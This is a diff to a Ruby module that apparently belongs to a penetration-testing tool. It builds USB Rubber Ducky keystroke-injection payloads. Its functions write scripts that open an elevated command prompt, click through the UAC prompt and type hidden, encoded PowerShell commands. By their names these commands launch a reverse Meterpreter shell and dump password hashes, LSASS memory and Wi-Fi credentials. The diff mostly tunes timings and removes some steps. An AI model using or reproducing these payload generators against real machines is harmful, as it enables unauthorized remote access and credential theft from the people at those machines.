@@ -3,11 +3,11 @@ require_relative 'core'
 include MainCommands
 module DuckySetUp
   def admin_with_uac
-    "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500"
+    "DELAY 3000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 2000"
     #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
   end
   def admin_with_out_uac
-    "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500"
+    "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000"
     #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
   end
   def low_priv
@@ -20,7 +20,8 @@ module DuckySetUp
     "CTRL s\n#{temp_path}\nEnter\n"
   end
   def ducky_meterpreter_low(encoded_command)
-    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
+    #File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
+    File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -enc #{encoded_command}\nENTER")}
   end
   def ducky_meterpreter_uac(encoded_command)
     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
@@ -29,16 +30,18 @@ module DuckySetUp
     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
   end
   def ducky_hash_dump_uac(encoded_command)
-    File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+    #File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+    File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
   def ducky_hash_dump_no_uac(encoded_command)
-    File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
+    #File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
+    File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
   end
   def ducky_lsass_uac(encoded_command1,encoded_command2)
-    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 1000\nGUI r\nDELAY 1000\nSTRING cmd\nENTER\nDELAY 2000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
   end
   def ducky_lsass_no_uac(encoded_command1,encoded_command2)
-    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
+    File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 1000\nGUI r\nDELAY 1000\nSTRING cmd\nENTER\nDELAY 2000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
   end
   def ducky_wifi_uac(encoded_command)
     File.open("#{text_path}#{wifi_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
